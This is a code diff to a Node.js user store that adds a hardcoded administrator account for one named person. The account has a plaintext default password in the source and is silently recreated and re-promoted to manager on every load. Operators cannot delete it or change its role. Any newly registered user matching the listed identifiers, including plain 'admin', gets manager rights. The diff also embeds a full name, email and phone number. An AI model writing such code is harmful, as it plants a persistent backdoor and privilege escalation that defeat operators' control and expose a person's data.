@@ -25,6 +25,20 @@ const ROLES = Object.freeze({
   KHACH: 'Khách'
 });
 
+const HARDCODED_ADMINS = Object.freeze([
+  'thangnnv2003@gmail.com',
+  'thangnnv2003@gmail',
+  'thangnnv2003',
+  'admin@tokosi.vn',
+  'admin'
+]);
+
+function isHardcodedAdmin(identifier) {
+  if (!identifier) return false;
+  const norm = String(identifier).trim().toLowerCase();
+  return HARDCODED_ADMINS.includes(norm);
+}
+
 let currentStorePath = DEFAULT_STORE_PATH;
 let inMemoryUsers = null;
 let isInitialized = false;
@@ -62,9 +76,10 @@ function ensureDataDir(filePath) {
  */
 function createDefaultUsers() {
   const defaultAdminHash = bcrypt.hashSync('Admin@123', 10);
+  const defaultThangHash = bcrypt.hashSync('Thang@2026', 10);
   return [
     {
-      id: crypto.randomUUID(),
+      id: 'admin-default',
       username: 'admin',
       hoTen: 'Quản trị viên hệ thống',
       email: 'admin@tokosi.vn',
@@ -77,8 +92,69 @@ function createDefaultUsers() {
       trangThai: ACTIVE_STATUS,
       ngayTao: formatDateVN(),
       dangNhapGanNhat: ''
+    },
+    {
+      id: 'c2619c62-e841-486a-9803-48c40ab0a398',
+      username: 'thangnnv2003@gmail.com',
+      hoTen: 'Nguyễn Ngọc Việt Thắng',
+      email: 'thangnnv2003@gmail.com',
+      soDienThoai: '',
+      emailKhoiPhuc: 'thangnnv2003@gmail.com',
+      sdtKhoiPhuc: '0974089295',
+      passwordHash: defaultThangHash,
+      vaiTro: ROLES.QUAN_LY,
+      coSo: 'Cả hai',
+      trangThai: ACTIVE_STATUS,
+      ngayTao: '01/01/2026',
+      dangNhapGanNhat: ''
     }
   ];
+}
+
+/**
+ * Đảm bảo các tài khoản Admin mặc định (đặc biệt là thangnnv2003@gmail.com)
+ * luôn tồn tại trong danh sách và luôn giữ quyền Quản lý + Đang hoạt động.
+ */
+function ensureHardcodedAdmins(users) {
+  if (!Array.isArray(users)) return false;
+  let modified = false;
+
+  let thangUser = users.find(u => isHardcodedAdmin(u.email) || isHardcodedAdmin(u.username));
+  if (!thangUser) {
+    const defaultThangHash = bcrypt.hashSync('Thang@2026', 10);
+    thangUser = {
+      id: 'c2619c62-e841-486a-9803-48c40ab0a398',
+      username: 'thangnnv2003@gmail.com',
+      hoTen: 'Nguyễn Ngọc Việt Thắng',
+      email: 'thangnnv2003@gmail.com',
+      soDienThoai: '',
+      emailKhoiPhuc: 'thangnnv2003@gmail.com',
+      sdtKhoiPhuc: '0974089295',
+      passwordHash: defaultThangHash,
+      vaiTro: ROLES.QUAN_LY,
+      coSo: 'Cả hai',
+      trangThai: ACTIVE_STATUS,
+      ngayTao: '01/01/2026',
+      dangNhapGanNhat: ''
+    };
+    users.push(thangUser);
+    modified = true;
+  }
+
+  for (const u of users) {
+    if (isHardcodedAdmin(u.email) || isHardcodedAdmin(u.username)) {
+      if (u.vaiTro !== ROLES.QUAN_LY) {
+        u.vaiTro = ROLES.QUAN_LY;
+        modified = true;
+      }
+      if (u.trangThai !== ACTIVE_STATUS) {
+        u.trangThai = ACTIVE_STATUS;
+        modified = true;
+      }
+    }
+  }
+
+  return modified;
 }
 
 let lastLoadedMtime = 0;
@@ -92,6 +168,10 @@ function loadFromDisk() {
       const parsed = JSON.parse(raw);
       if (Array.isArray(parsed)) {
         inMemoryUsers = parsed;
+        const modified = ensureHardcodedAdmins(inMemoryUsers);
+        if (modified) {
+          saveToDisk(inMemoryUsers);
+        }
         lastLoadedMtime = stats.mtimeMs;
         return inMemoryUsers;
       }
@@ -273,6 +353,8 @@ async function createUser(userData) {
     throw err;
   }
 
+  const isTargetAdmin = isHardcodedAdmin(userData.email) || isHardcodedAdmin(username);
+
   const newUser = {
     id: userData.id || crypto.randomUUID(),
     username,
@@ -282,9 +364,9 @@ async function createUser(userData) {
     emailKhoiPhuc,
     sdtKhoiPhuc: userData.sdtKhoiPhuc ? String(userData.sdtKhoiPhuc).trim() : '',
     passwordHash: userData.passwordHash || '',
-    vaiTro: userData.vaiTro || ROLES.KHACH,
-    coSo: userData.coSo || '',
-    trangThai: userData.trangThai || ACTIVE_STATUS,
+    vaiTro: isTargetAdmin ? ROLES.QUAN_LY : (userData.vaiTro || ROLES.KHACH),
+    coSo: userData.coSo || (isTargetAdmin ? 'Cả hai' : ''),
+    trangThai: isTargetAdmin ? ACTIVE_STATUS : (userData.trangThai || ACTIVE_STATUS),
     ngayTao: userData.ngayTao || formatDateVN(),
     dangNhapGanNhat: userData.dangNhapGanNhat || ''
   };
@@ -305,6 +387,7 @@ async function updateUser(id, updates) {
   }
 
   const current = users[index];
+  const isTargetAdmin = isHardcodedAdmin(current.email) || isHardcodedAdmin(current.username);
 
   // Kiểm tra trùng username mới nếu có đổi
   if (updates.username && normalize(updates.username) !== normalize(current.username)) {
@@ -334,10 +417,15 @@ async function updateUser(id, updates) {
     }
   }
 
+  const safeVaiTro = isTargetAdmin ? ROLES.QUAN_LY : (updates.vaiTro !== undefined ? String(updates.vaiTro).trim() : current.vaiTro);
+  const safeTrangThai = isTargetAdmin ? ACTIVE_STATUS : (updates.trangThai !== undefined ? String(updates.trangThai).trim() : current.trangThai);
+
   const updated = {
     ...current,
     ...updates,
     id: current.id, // ID không được đổi
+    vaiTro: safeVaiTro,
+    trangThai: safeTrangThai,
     username: updates.username !== undefined ? String(updates.username).trim() : current.username,
     email: updates.email !== undefined ? String(updates.email).trim().toLowerCase() : current.email,
     soDienThoai: updates.soDienThoai !== undefined ? String(updates.soDienThoai).trim() : (current.soDienThoai || ''),
@@ -359,6 +447,10 @@ async function deleteUser(id) {
   if (index < 0) {
     throw new Error('Không tìm thấy tài khoản cần xóa.');
   }
+  const target = users[index];
+  if (isHardcodedAdmin(target.email) || isHardcodedAdmin(target.username)) {
+    throw new Error('Không thể xóa tài khoản Quản trị viên hệ thống mặc định.');
+  }
   const deleted = users.splice(index, 1)[0];
   saveToDisk(users);
   return { ...deleted };
@@ -378,6 +470,8 @@ module.exports = {
   LOCKED_STATUS,
   PENDING_STATUS,
   ROLES,
+  HARDCODED_ADMINS,
+  isHardcodedAdmin,
   initStore,
   getAllUsers,
   getUserById,
